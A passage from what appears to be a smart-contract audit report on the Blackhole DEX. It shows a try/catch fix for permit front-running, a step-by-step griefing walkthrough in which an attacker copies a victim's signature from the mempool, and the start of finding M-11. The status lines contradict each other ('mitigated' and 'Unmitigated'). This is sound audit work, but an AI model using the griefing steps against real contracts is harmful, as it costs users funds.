class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountAMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountBMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapproveMax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ev\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003er\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003es\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epairFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapproveMax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ? \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e : \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Try permit, but don\u0026#39;t revert if it fails\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003etry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epermit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ev\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003er\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003es\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Permit succeeded\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ecatch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Permit failed, check if we have sufficient allowance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eallowance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient allowance\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eremoveLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountAMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountBMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis approach follows the industry-standard mitigation pattern that successfully resolved this vulnerability across 100+ affected codebases.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-6\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eTheoretical attack walkthrough:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSetup Phase\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlice holds 1000 LP tokens in pair \u003ccode\u003e0xABC...\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eAlice wants to remove liquidity efficiently using \u003ccode\u003eremoveLiquidityWithPermit()\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eBob (attacker) monitors the mempool for permit-based transactions\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSignature Creation\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlice creates permit signature: \u003ccode\u003epermit(alice, routerV2, 1000, deadline, nonce=5)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSignature parameters: \u003ccode\u003ev=27, r=0x123..., s=0x456...\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTransaction Submission\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlice submits: \u003ccode\u003eremoveLiquidityWithPermit(tokenA, tokenB, false, 1000, 950, 950, alice, deadline, false, 27, 0x123..., 0x456...)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eTransaction enters mempool with 20 gwei gas price\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eFront-Running Execution\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eBob extracts parameters from Alice’s pending transaction\u003c/li\u003e\n\u003cli\u003eBob submits direct call: \u003ccode\u003eIBaseV1Pair(0xABC...).permit(alice, routerV2, 1000, deadline, 27, 0x123..., 0x456...)\u003c/code\u003e with 25 gwei gas\u003c/li\u003e\n\u003cli\u003eBob’s transaction mines first, consuming Alice’s nonce (nonce becomes 6)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eVictim Transaction Failure\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlice’s transaction executes but fails at line 475\u003c/li\u003e\n\u003cli\u003eRouterV2 calls \u003ccode\u003epermit()\u003c/code\u003e with already-used signature\u003c/li\u003e\n\u003cli\u003eLP token rejects due to invalid nonce (expects 6, gets signature for nonce 5)\u003c/li\u003e\n\u003cli\u003eEntire transaction reverts with “Invalid signature” or similar error\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Result\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlice loses ~\u003ccode\u003e$15\u003c/code\u003e in gas fees (failed transaction cost)\u003c/li\u003e\n\u003cli\u003eAlice cannot remove liquidity via permit method\u003c/li\u003e\n\u003cli\u003eBob spent ~\u003ccode\u003e$3\u003c/code\u003e in gas to grief Alice\u003c/li\u003e\n\u003cli\u003eAttack can be repeated indefinitely against any permit user\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003eImpact Example:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDuring high network activity (50+ gwei), failed transactions cost \u003ccode\u003e$25-75\u003c/code\u003e each\u003c/li\u003e\n\u003cli\u003eSystematic attacks against 100 users = \u003ccode\u003e$2,500-7,500\u003c/code\u003e in direct user losses\u003c/li\u003e\n\u003cli\u003eNo recourse for affected users; losses are permanent\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Unmitigated. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-34\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-11\"\u003elonelybones\u003c/a\u003e, and also included in the \u003ca href=\"#mitigation-review\"\u003eMitigation Review\u003c/a\u003e section below.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-11-incorrect-function-call-in-bribefactoryv3-recovererc20andupdatedata\" style=\"position:relative;\"\u003e\u003ca href=\"#m-11-incorrect-function-call-in-bribefactoryv3-recovererc20andupdatedata\" aria-label=\"m 11 incorrect function call in bribefactoryv3 recovererc20andupdatedata permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-142\"\u003e[M-11] Incorrect function call in \u003ccode\u003eBribeFactoryV3\u003c/code\u003e \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-74\"\u003eEgbe\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-446\"\u003eNexusAudits\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/factories/BribeFactoryV3.sol#L209-L219\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/factories/BribeFactoryV3.sol#L209-L219\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-8\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-8\" aria-label=\"finding description 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e function in the \u003ccode\u003eBribeFactoryV3\u003c/code\u003e contract incorrectly calls \u003ccode\u003eemergencyRecoverERC20\u003c/code\u003e instead of \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e on the \u003ccode\u003eIBribe\u003c/code\u003e interface. This misnamed function call results in the failure to update the \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e mapping in the \u003ccode\u003eBribe\u003c/code\u003e contract, which is critical for maintaining accurate reward accounting.\u003c/p\u003e\n\u003ch3 id=\"root-cause-1\" style=\"position:relative;\"\u003e\u003ca href=\"#root-cause-1\" aria-label=\"root cause 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRoot Cause\u003c/h3\u003e\n\u003cp\u003eIn \u003ccode\u003eBribeFactoryV3.sol\u003c/code\u003e, the \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e function is defined as follows:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erecoverERC20AndUpdateData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;MISMATCH_LEN\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan 